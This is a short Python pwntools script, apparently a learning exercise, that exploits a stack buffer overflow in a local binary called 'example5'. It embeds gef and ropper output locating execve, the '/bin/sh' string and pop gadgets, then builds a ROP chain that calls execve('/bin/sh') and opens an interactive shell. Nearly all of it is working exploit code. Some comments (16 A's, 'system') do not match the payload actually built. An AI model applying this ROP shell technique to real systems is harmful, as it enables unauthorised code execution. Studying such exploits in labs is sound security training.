#!/usr/bin/python3
from pwn import *

# 59	sys_execve	const char *filename	const char *const argv[]	const char *const envp[]
# http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/

#analise estatica: 

"""
gef➤  disas execve
Dump of assembler code for function execve:
   0x00007ffff7eb52f0 <+0>:     endbr64
   0x00007ffff7eb52f4 <+4>:     mov    eax,0x3b
   0x00007ffff7eb52f9 <+9>:     syscall

gef➤  search-pattern "/bin/sh"
[+] Searching '/bin/sh' in memory
[+] In '/usr/lib/x86_64-linux-gnu/libc-2.31.so'(0x7ffff7f6c000-0x7ffff7fb6000), permission=r--
  0x7ffff7f865aa - 0x7ffff7f865b1  →   "/bin/sh"


#gadgets
#ropper --file example4 --search "pop"

0x00000000004011d1: pop rsi; pop r15; ret;
0x00000000004011d3: pop rdi; ret;

"""



pop_rdi = p64(0x00000000004011d3)
pop_rsi_r15 = p64(0x00000000004011d1)
shellString = p64(0x7ffff7f865aa)
execve = p64(0x00007ffff7eb52f0)

#cria um processo e se conecta a ele
p = process("example5")

#cria um payload para enviar. 16 A's para o buffer, 8 A's para o rbp salvo na pilha e um ponteiro para o endereço desejado
## Pading
## pop rdi
## &"/bin/sh"
## system
payload = b"\x90"*40 + pop_rsi_r15+p64(0)+p64(0)+pop_rdi + shellString + execve




input(">")


p.sendline(payload)
p.interactive()



